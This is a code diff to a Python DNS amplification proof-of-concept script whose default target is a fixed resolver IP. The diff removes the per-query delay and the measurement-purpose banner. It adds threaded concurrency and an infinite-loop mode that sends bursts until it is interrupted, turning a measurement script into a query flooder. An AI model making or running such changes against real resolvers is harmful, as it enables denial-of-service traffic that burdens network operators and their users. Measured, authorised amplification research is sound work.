@@ -16,7 +16,8 @@ Usage:
   python3 dns_amp_poc.py --target 104.236.68.226 --csv
 """
 
-import socket, struct, random, time, argparse, sys
+import socket, struct, random, time, argparse, sys, threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from dataclasses import dataclass
 
 TARGET_DEFAULT = "104.236.68.226"
@@ -135,25 +136,29 @@ class Result:
     latency_ms: float
 
 
-def run_poc(target: str, verbose: bool = True) -> list:
+def run_poc(target: str, verbose: bool = True, concurrency: int = 1, loops: int = 1) -> list:
     results = []
+    _lock   = threading.Lock()
+    burst   = 0
+    total_sent = 0
 
     print(f"\n{'='*72}")
     print(f"  DNS Amplification PoC")
     print(f"  Target resolver : {target}:{PORT}")
     print(f"  Method          : UDP — legitimate queries, local source IP")
-    print(f"  Purpose         : Measure amplification factor per query type")
+    print(f"  Concurrency     : {concurrency}  |  Loops: {'∞ (Ctrl+C)' if loops == 0 else loops}")
     print(f"{'='*72}\n")
-    print(f"  {'Domain':<22} {'QType':<8} {'QSz':>5} {'RSz':>6} {'Amp':>7}  {'RC':<10} {'AN':>4}  Note")
-    print(f"  {'-'*22} {'-'*8} {'-'*5} {'-'*6} {'-'*7}  {'-'*10} {'-'*4}  ----")
 
-    for domain, qtype, note in TEST_MATRIX:
+    if concurrency == 1:
+        print(f"  {'Domain':<22} {'QType':<8} {'QSz':>5} {'RSz':>6} {'Amp':>7}  {'RC':<10} {'AN':>4}  Note")
+        print(f"  {'-'*22} {'-'*8} {'-'*5} {'-'*6} {'-'*7}  {'-'*10} {'-'*4}  ----")
+
+    def probe_one(domain, qtype, note):
         query = build_query(domain, qtype, edns0=True)
         q_sz  = len(query)
         t0    = time.time()
         resp  = send_query(target, query)
         lat   = (time.time() - t0) * 1000
-
         if resp is None:
             r_sz = 0; amp = 0.0; rcode = "TIMEOUT"; ancount = 0; ra = False
         else:
@@ -162,14 +167,44 @@ def run_poc(target: str, verbose: bool = True) -> list:
             rcode   = parse_rcode(resp)
             ancount = parse_ancount(resp)
             ra      = check_recursion_available(resp)
+        return Result(domain, qtype, note, q_sz, r_sz, amp, rcode, ancount, ra, lat)
 
-        res = Result(domain, qtype, note, q_sz, r_sz, amp, rcode, ancount, ra, lat)
-        results.append(res)
+    # Expand matrix to fill concurrency slots by repeating entries
+    import math
+    reps    = max(1, math.ceil(concurrency / len(TEST_MATRIX)))
+    work    = (TEST_MATRIX * reps)[:concurrency]
 
-        amp_str = f"{amp:.1f}x" if amp > 0 else "—"
-        flag    = " ◄ MAX" if amp == max((r.amp_factor for r in results), default=0) and amp > 1 else ""
-        print(f"  {domain:<22} {qtype:<8} {q_sz:>5} {r_sz:>6} {amp_str:>7}  {rcode:<10} {ancount:>4}  {note[:30]}{flag}")
-        time.sleep(0.1)
+    loop_count = 0
+    try:
+        while loops == 0 or loop_count < loops:
+            loop_count += 1
+            burst += 1
+            loop_results = []
+
+            with ThreadPoolExecutor(max_workers=concurrency) as pool:
+                futs = {pool.submit(probe_one, d, q, n): (d, q, n)
+                        for d, q, n in work}
+                for f in as_completed(futs):
+                    res = f.result()
+                    loop_results.append(res)
+                    total_sent += 1
+                    with _lock:
+                        results.append(res)
+
+            if concurrency > 1:
+                ok  = sum(1 for r in loop_results if r.resp_sz > 0)
+                top = max(loop_results, key=lambda r: r.amp_factor, default=None)
+                amp_str = f"{top.amp_factor:.1f}x ({top.qtype}/{top.domain})" if top and top.amp_factor > 0 else "—"
+                print(f"  [Burst {burst:>3}] sent={len(loop_results)}  ok={ok}  peak={amp_str}  total_sent={total_sent}")
+            else:
+                for res in sorted(loop_results, key=lambda r: TEST_MATRIX.index((r.domain, r.qtype, r.note))):
+                    amp_str = f"{res.amp_factor:.1f}x" if res.amp_factor > 0 else "—"
+                    with _lock:
+                        flag = " ◄ MAX" if results and res.amp_factor == max(r.amp_factor for r in results) and res.amp_factor > 1 else ""
+                    print(f"  {res.domain:<22} {res.qtype:<8} {res.query_sz:>5} {res.resp_sz:>6} {amp_str:>7}  {res.rcode:<10} {res.ancount:>4}  {res.note[:30]}{flag}")
+
+    except KeyboardInterrupt:
+        print(f"\n  [STOPPED]  bursts={burst}  total_queries_sent={total_sent}")
 
     return results
 
@@ -216,12 +251,15 @@ def print_csv(results: list):
 
 def main():
     ap = argparse.ArgumentParser(description="DNS Amplification PoC — open resolver measurement")
-    ap.add_argument("--target", default=TARGET_DEFAULT, help="Resolver IP to test")
-    ap.add_argument("--csv",    action="store_true",    help="Also output CSV for paper/chart")
-    ap.add_argument("--quiet",  action="store_true",    help="Suppress per-query output")
+    ap.add_argument("--target",      default=TARGET_DEFAULT, help="Resolver IP to test")
+    ap.add_argument("--csv",         action="store_true",    help="Also output CSV for paper/chart")
+    ap.add_argument("--quiet",       action="store_true",    help="Suppress per-query output")
+    ap.add_argument("--concurrency", type=int, default=1,    help="Parallel queries per burst (default 1)")
+    ap.add_argument("--loops",       type=int, default=1,    help="Number of full matrix loops (0 = run until Ctrl+C)")
     args = ap.parse_args()
 
-    results = run_poc(args.target, verbose=not args.quiet)
+    results = run_poc(args.target, verbose=not args.quiet,
+                      concurrency=args.concurrency, loops=args.loops)
     print_summary(results, args.target)
     if args.csv:
         print_csv(results)
